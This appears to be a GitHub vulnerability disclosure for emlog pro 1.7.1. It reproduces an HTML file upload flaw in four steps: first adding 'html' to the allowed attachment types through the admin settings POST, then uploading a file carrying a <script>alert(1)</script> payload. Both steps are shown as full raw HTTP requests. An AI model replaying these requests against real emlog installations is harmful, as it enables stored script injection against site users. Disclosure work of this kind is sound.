# emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload

Affected Product and Version: emlog pro:1.7.1
https://github.com/emlog/emlog

Description: emlog is a Chinese product. is a fast, stable and easy-to-use blog and CMS website building system based on PHP and MySQL

Vulnerability reproduction video：[![asciicast](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/Reproduce%20video.mp4)

Impact: The attacker may run malicious code on the server and compromise the confidentiality, integrity, and availability of the server and application.


1.Download and install

2.go to page /admin/setting.php --> Base settings --> Upload settings add ,html or whatever you want
![image](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/pic1.png)

    POST /emlog_pro_1.7.1/admin/setting.php?action=save HTTP/1.1
    Host: 192.168.56.129
    Content-Length: 664
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://192.168.56.129
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://192.168.56.129/emlog_pro_1.7.1/admin/setting.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Cookie: PHPSESSID=ai393e7prtdmdi7jqqofqog5v6; EM_AUTHCOOKIE_SIs6Dzfm1KWYDIu5bpKvkHYUyAp3Dkr3=admin%7C%7C6f9ba179db428ade3ea5607976f27376
    Connection: close

    blogname=EMLOG&bloginfo=%E4%BD%BF%E7%94%A8emlog%E6%90%AD%E5%BB%BA%E7%9A%84%E7%AB%99%E7%82%B9&blogurl=http%3A%2F%2Flocalhost%2Femlog_pro_1.7.1%2F&timezone=Asia%2FShanghai&icp=&footer_info=powered+by+%3Ca+href%3D%22https%3A%2F%2Fwww.emlog.net%22%3Eemlog+pro%3C%2Fa%3E&iscomment=y&ischkcomment=y&isgravatar=y&comment_needchinese=y&comment_paging=y&comment_pnum=10&comment_order=newer&comment_interval=60&index_lognum=10&rss_output_num=10&rss_output_fulltext=y&att_maxsize=1024000&att_type=rar%2Czip%2Cgif%2Cjpg%2Cjpeg%2Cpng%2Ctxt%2Cpdf%2Cdocx%2Cdoc%2Cxls%2Cxlsx%2Cmp4%2Chtml&isthumbnail=y&att_imgmaxw=600&att_imgmaxh=370&token=0dc0c20566b0d1859f34bc558c4ae2536fcf4554
    
    
    
    
    
3.go to page /admin/media.php  upload a HTML file like <script>alert(1)</script> or <h1>test</h1>
![image](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/pic2.png)
![image](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/pic3.png)



    POST /emlog_pro_1.7.1/admin/media.php?action=upload&sid=0 HTTP/1.1
    Host: 192.168.56.129
    Content-Length: 222
    Accept: application/json
    Cache-Control: no-cache
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF8xgtkwhhBYaGrbT
    Origin: http://192.168.56.129
    Referer: http://192.168.56.129/emlog_pro_1.7.1/admin/media.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Cookie: PHPSESSID=ai393e7prtdmdi7jqqofqog5v6; EM_AUTHCOOKIE_SIs6Dzfm1KWYDIu5bpKvkHYUyAp3Dkr3=admin%7C%7C6f9ba179db428ade3ea5607976f27376
    Connection: close

    ------WebKitFormBoundaryF8xgtkwhhBYaGrbT
    Content-Disposition: form-data; name="file"; filename="test.html"
    Content-Type: text/html

    <h1>test</h1>
    <script>alert(1)</script>
    ------WebKitFormBoundaryF8xgtkwhhBYaGrbT--
    
    
    
    
    
4.Find the uploaded file and trigger. licked icons displayed or opens in new page
![image](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/pic4.png)

![image](https://github.com/happy0717/emlog-pro-1.7.1-is-vulnerable-to-HTML-File-Upload/blob/main/pic5.png)




